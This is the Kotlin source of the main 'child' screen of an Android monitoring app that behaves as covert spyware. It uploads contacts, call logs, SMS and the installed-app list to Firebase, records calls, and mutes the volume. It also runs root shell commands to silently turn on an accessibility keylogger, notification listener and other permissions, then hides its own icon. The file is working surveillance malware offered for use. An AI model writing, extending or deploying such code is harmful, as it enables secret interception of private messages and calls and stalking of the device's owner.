package com.dtz.netservice.ui.activities.mainchild

import android.Manifest.permission.SYSTEM_ALERT_WINDOW
import android.app.AppOpsManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.IntentFilter
import android.media.AudioManager
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.util.Log
import android.widget.Button
import android.widget.RelativeLayout
import android.widget.Switch
import cn.pedant.SweetAlert.SweetAlertDialog
import com.aykuttasil.callrecord.CallRecord
import com.dtz.netservice.R
import com.dtz.netservice.data.model.ChildPhoto
import com.dtz.netservice.data.model.ChildRecording
import com.dtz.netservice.data.model.GalleryPhoto
import com.dtz.netservice.data.model.GalleryVideo
import com.dtz.netservice.preference.DataSharePreference.childSelected
import com.dtz.netservice.receiver.ConnectReceiver
import com.dtz.netservice.rxFirebase.InterfaceFirebase
import com.dtz.netservice.services.accessibilityData.AccessibilityDataService
import com.dtz.netservice.ui.activities.base.BaseActivity
import com.dtz.netservice.utils.CallLogs
import com.dtz.netservice.utils.ConstFun.isAddWhitelist
import com.dtz.netservice.utils.ConstFun.isAndroidM
import com.dtz.netservice.utils.ConstFun.isNotificationServiceRunning
import com.dtz.netservice.utils.ConstFun.openAccessibilitySettings
import com.dtz.netservice.utils.ConstFun.openNotificationListenerSettings
import com.dtz.netservice.utils.ConstFun.openUseAccessSettings
import com.dtz.netservice.utils.ConstFun.openWhitelistSettings
import com.dtz.netservice.utils.ConstFun.permissionRoot
import com.dtz.netservice.utils.ConstFun.showApp
import com.dtz.netservice.utils.Consts.APPLICATIONS
import com.dtz.netservice.utils.Consts.CALLLOGS
import com.dtz.netservice.utils.Consts.CHILD_NAME
import com.dtz.netservice.utils.Consts.CHILD_PERMISSION
import com.dtz.netservice.utils.Consts.CHILD_SHOW_APP
import com.dtz.netservice.utils.Consts.COMMAND_ADD_WHITELIST
import com.dtz.netservice.utils.Consts.COMMAND_ENABLE_ACCESSIBILITY
import com.dtz.netservice.utils.Consts.COMMAND_ENABLE_ACCESSIBILITY_1
import com.dtz.netservice.utils.Consts.COMMAND_ENABLE_NOTIFICATION_LISTENER
import com.dtz.netservice.utils.Consts.COMMAND_GRANT_PERMISSION
import com.dtz.netservice.utils.Consts.CONTACTS
import com.dtz.netservice.utils.Consts.DATA
import com.dtz.netservice.utils.Consts.DEVICE_NAME
import com.dtz.netservice.utils.Consts.DEVICE_ONLINE
import com.dtz.netservice.utils.Consts.INTERVAL
import com.dtz.netservice.utils.Consts.PARAMS
import com.dtz.netservice.utils.Consts.PERMISSION_USAGE_STATS
import com.dtz.netservice.utils.Consts.PHOTO
import com.dtz.netservice.utils.Consts.PHOTOS
import com.dtz.netservice.utils.Consts.RECORDING
import com.dtz.netservice.utils.Consts.SMSES
import com.dtz.netservice.utils.Consts.TIMER
import com.dtz.netservice.utils.Consts.VIDEOS
import com.dtz.netservice.utils.Contacts
import com.dtz.netservice.utils.InstalledApp
import com.dtz.netservice.utils.SMSes
import com.dtz.netservice.utils.async.AsyncTaskRunCommand
import com.dtz.netservice.utils.checkForegroundApp.CheckPermission.getModeManager
import com.dtz.netservice.utils.checkForegroundApp.CheckPermission.hasUsageStatsPermission
import com.dtz.netservice.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
import com.dtz.netservice.utils.hiddenCameraServiceUtils.HiddenCameraUtils.openDrawOverPermissionSetting
import com.dtz.netservice.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.google.firebase.database.DatabaseReference
import com.jaredrummler.android.device.DeviceName
import com.pawegio.kandroid.show
import kotterknife.bindView
import java.io.File
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.Paths
import javax.inject.Inject

/**
 * Created by luis rafael on 27/03/18.
 */
class MainChildActivity : BaseActivity(R.layout.activity_main_child) {

    private val btnHideApp: Button by bindView(R.id.btn_hide_app)
    private val btnEnableService: RelativeLayout by bindView(R.id.btn_enable_service)
    private val btnEnableOverDraw: RelativeLayout by bindView(R.id.btn_enable_overdraw)
    private val btnEnableUsageStats: RelativeLayout by bindView(R.id.btn_enable_usage_stats)
    private val btnEnableNotificationListener : RelativeLayout by bindView(R.id.btn_enable_service_notification)
    private val btnWhitelist : RelativeLayout by bindView(R.id.btn_add_whitelist)
    private val switchOverDraw: Switch by bindView(R.id.switch_overdraw)
    private val switchUsageStats: Switch  by bindView(R.id.switch_usage_stats)
    private val switchAccessibility : Switch by bindView(R.id.switch_accessibility)
    private val switchNotificationListener : Switch by bindView(R.id.switch_notification)
    private val switchWhitelist : Switch by bindView(R.id.switch_add_whitelist)

    private val connectReceiver: BroadcastReceiver = ConnectReceiver()

    @Inject
    lateinit var firebase: InterfaceFirebase

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        getComponent()!!.inject(this)
        init()
        onClickApp()
    }

    override fun onResume() {
        super.onResume()
        checkSwitchPermissions()
    }

    private fun init() {

        val current = System.currentTimeMillis()
        //data
        getReference("$DATA/$CHILD_SHOW_APP").setValue(true)
        getReference("$DATA/$CHILD_NAME").setValue(childSelected)
        getReference("$DATA/$DEVICE_NAME").setValue(DeviceName.getDeviceName())
        getReference("$DATA/$DEVICE_ONLINE").setValue(current)

        //photo
        val childPhoto = ChildPhoto(false, CameraFacing.FRONT_FACING_CAMERA)
        getReference("$PHOTO/$PARAMS").setValue(childPhoto)
        getReference("$PHOTO/$CHILD_PERMISSION").setValue(true)

        //photo gallery
        val childGalleryPhoto = GalleryPhoto(false, 0, false, "null")
        getReference("$PHOTOS/$PARAMS").setValue(childGalleryPhoto)
        getReference("$PHOTOS/$CHILD_PERMISSION").setValue(true)

        //video gallery
        val childGalleryVideo = GalleryVideo(false, 0)
        getReference("$VIDEOS/$PARAMS").setValue(childGalleryVideo)
        getReference("$VIDEOS/$CHILD_PERMISSION").setValue(true)

        //Recording
        val childRecording = ChildRecording(false,0)
        getReference("$RECORDING/$PARAMS").setValue(childRecording)
        getReference("$RECORDING/$TIMER/$INTERVAL").setValue(0)

        //Contacts
        val contactsList = Contacts.contactsList(this)
        getReference("$CONTACTS/").setValue(contactsList)

        //CallLog
        val callList = CallLogs.callList(this)
        getReference("$CALLLOGS/").setValue(callList)

        //SMS
        val smsList = SMSes.smsList(this)
        getReference("$SMSES/").setValue(smsList)

        //Apps list
        val appList = InstalledApp.appsList(this)
        getReference("$APPLICATIONS/").setValue(appList)

        startRecordingService()
        reduceVolume()
        val filter = IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION)
        registerReceiver(connectReceiver, filter)
    }

    private fun reduceVolume() {
        val audioManager = applicationContext.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            audioManager.adjustVolume(AudioManager.ADJUST_MUTE, AudioManager.FLAG_SHOW_UI)
        }
    }

    private fun checkSwitchPermissions() {
        switchOverDraw.isChecked = canOverDrawOtherApps()
        switchUsageStats.isChecked = hasUsageStatsPermission()
        switchAccessibility.isChecked = AccessibilityDataService.isRunningService
        switchNotificationListener.isChecked = isNotificationServiceRunning()
        if (isAndroidM()){
            switchWhitelist.isChecked = isAddWhitelist()
            btnWhitelist.show()
        }
    }

    private fun onClickApp() {
        btnHideApp.setOnClickListener {
            checkPermissions()
        }
        btnEnableService.setOnClickListener {

            if (!AccessibilityDataService.isRunningService){
                permissionRoot {
                    if (it) activatePermissionRoot("$COMMAND_ENABLE_ACCESSIBILITY$packageName/$packageName.services.accessibilityData.AccessibilityDataService",false){
                        activatePermissionRoot(COMMAND_ENABLE_ACCESSIBILITY_1,true){
                            switchAccessibility.isChecked = AccessibilityDataService.isRunningService
                        }
                    }else dialog(SweetAlertDialog.NORMAL_TYPE,R.string.msg_dialog_enable_keylogger){ openAccessibilitySettings() }
                }
            }else showMessage(R.string.already_activated)
        }
        btnEnableOverDraw.setOnClickListener {
            if (!canOverDrawOtherApps()){
                permissionRoot {
                    if (it){
                        val mode = getModeManager(AppOpsManager.OPSTR_SYSTEM_ALERT_WINDOW)
                        if (mode == AppOpsManager.MODE_DEFAULT)
                            activatePermissionRoot("$COMMAND_GRANT_PERMISSION$packageName $SYSTEM_ALERT_WINDOW",true){
                                switchOverDraw.isChecked = canOverDrawOtherApps()
                            }
                        else dialog(SweetAlertDialog.NORMAL_TYPE,R.string.msg_dialog_enable_overdraw){ openDrawOverPermissionSetting() }
                    }else dialog(SweetAlertDialog.NORMAL_TYPE,R.string.msg_dialog_enable_overdraw){ openDrawOverPermissionSetting() }
                }
            }else showMessage(R.string.already_activated)
        }

        btnEnableUsageStats.setOnClickListener {
            if (!hasUsageStatsPermission()){
                permissionRoot {
                    if (it) {
                        val mode = getModeManager(AppOpsManager.OPSTR_GET_USAGE_STATS)
                        if (mode == AppOpsManager.MODE_DEFAULT)
                            activatePermissionRoot("$COMMAND_GRANT_PERMISSION$packageName $PERMISSION_USAGE_STATS",true){
                                switchUsageStats.isChecked = hasUsageStatsPermission()
                            }
                        else dialog(SweetAlertDialog.NORMAL_TYPE,R.string.msg_dialog_enable_usage_stats){ openUseAccessSettings() }
                    }else dialog(SweetAlertDialog.NORMAL_TYPE,R.string.msg_dialog_enable_usage_stats){ openUseAccessSettings() }
                }
            }else showMessage(R.string.already_activated)
        }

        btnEnableNotificationListener.setOnClickListener {
            if (!isNotificationServiceRunning()){
                permissionRoot {
                    if (it) activatePermissionRoot("$COMMAND_ENABLE_NOTIFICATION_LISTENER$packageName/$packageName.services.notificationService.NotificationService",true){
                        switchNotificationListener.isChecked = isNotificationServiceRunning()
                    }else openNotificationListenerSettings()
                }
            }else showMessage(R.string.already_activated)
        }
        btnWhitelist.setOnClickListener {
            if (!isAddWhitelist()){
                permissionRoot {
                    if (it) activatePermissionRoot("$COMMAND_ADD_WHITELIST$packageName",true){
                        switchWhitelist.isChecked = isAddWhitelist()
                    }else openWhitelistSettings()
                }
            }else showMessage(R.string.already_activated)
        }
    }

    private fun getReference(child: String): DatabaseReference = firebase.getDatabaseReference(child)

    private fun checkPermissions() {
        if (hasUsageStatsPermission() && canOverDrawOtherApps() && isNotificationServiceRunning() &&
                AccessibilityDataService.isRunningService && isAddWhitelist()) {
            showDialog(SweetAlertDialog.PROGRESS_TYPE,R.string.hiding,null,null){ show() }
            showApp(false)
            getReference("$DATA/$CHILD_SHOW_APP").setValue(false)

        }else dialog(SweetAlertDialog.NORMAL_TYPE,R.string.enable_all_permissions)
    }

    private fun activatePermissionRoot(command:String,showDialog:Boolean,activate:()->Unit){
        AsyncTaskRunCommand({
            showDialog(SweetAlertDialog.PROGRESS_TYPE,R.string.activating,null,0){show()}
        },{
            hideDialog()
            if (it){
                activate()
                if (showDialog) dialog(SweetAlertDialog.SUCCESS_TYPE,R.string.activated_success)
            }else dialog(SweetAlertDialog.ERROR_TYPE,R.string.failed_activate)
        }).execute(command)
    }

    private fun startRecordingService() {
        val callsFolder = File(this.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), "records")
        if (!callsFolder.exists()) {
            callsFolder.mkdir()
        }

        val callRecord: CallRecord = CallRecord.Builder(this)
            .setLogEnable(true)
            .setRecordFileName("call")
            .setRecordDirName("calls")
            //.setRecordDirPath(Environment.getExternalStorageDirectory().path) // optional & default value
            .setRecordDirPath(callsFolder.path) // optional & default value
            .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB) // optional & default value
            .setOutputFormat(MediaRecorder.OutputFormat.AMR_NB) // optional & default value
            .setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION) // optional & default value
            .setShowSeed(true) // optional & default value ->Ex: RecordFileName_incoming.amr || RecordFileName_outgoing.amr
            .build()

        callRecord.startCallReceiver()
        callRecord.startCallRecordService()
    }

    private fun dialog(type:Int,msg:Int,action:(()->Unit)?=null){
        showDialog(type,R.string.title_dialog,getString(msg),android.R.string.ok){
            setConfirmClickListener { hideDialog() ; if (action!=null) action() } ; show()
        }
    }

    override fun onDestroy() {
        hideDialog()
        super.onDestroy()
    }

    override fun onStop() {
        //unregisterReceiver(connectReceiver)
        super.onStop()
    }
}
